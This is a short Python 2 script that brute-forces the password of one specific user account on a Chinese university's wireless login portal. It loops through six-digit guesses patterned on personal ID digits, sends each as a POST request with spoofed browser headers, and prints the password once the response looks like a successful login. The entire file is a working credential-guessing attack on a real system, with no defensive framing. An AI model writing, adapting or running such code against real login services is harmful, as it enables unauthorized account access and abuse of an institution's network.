__author__ = 'lms'

import requests
import time

request_url = "http://w.nuaa.edu.cn/iPortal/action/doLogin.do"
login_info = {
                'username': '70204838',
                'password': '',
                'saved': '1',
                "from": '003cc944be32e25365428f2dd2adbbe2',
                'domain': 'nuaa'
                 }

headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.6',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'w.nuaa.edu.cn',
            'Origin': 'http://w.nuaa.edu.cn',
            'Referer': 'http://w.nuaa.edu.cn/iPortal/index.htm?'
                      'from=003cc944be32e25365428f2dd2adbbe2&wlanuserfirsturl=http://www.baidu.com/',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) '
                        'Chrome/38.0.2125.104 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'

            }

password_prefix = ['01', '02', '03', '04', '05', '06', '07', '08', '09']
password_index = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
password_male = ['1', '3', '5', '7', '9']
password_female = ['0', '2', '4', '6', '8']

for prefix in range(10, 32):
    password_prefix.append(str(prefix))


exit_flag = 0

start_cpu = time.clock()
for i in range(31):
    for j in range(10):
        for k in range(10):
            for m in range(5):
                for n in range(10):
                    login_info['password'] = '27'+password_index[j]+password_index[k]\
                                             +password_male[m]+password_index[n]
                    print login_info['password']

                    loginRequest = requests.post(request_url, data=login_info, headers=headers)
                    if loginRequest.headers['content-length'] >= '258':
                        print "haha"
                        print "The password is " + login_info['password']
                        exit_flag = 1
                        break
                if exit_flag:
                    break
            if exit_flag:
                break
        if exit_flag:
            break
    if exit_flag:
        break

end_cpu = time.clock()
print "The time spent is " + str(end_cpu-start_cpu)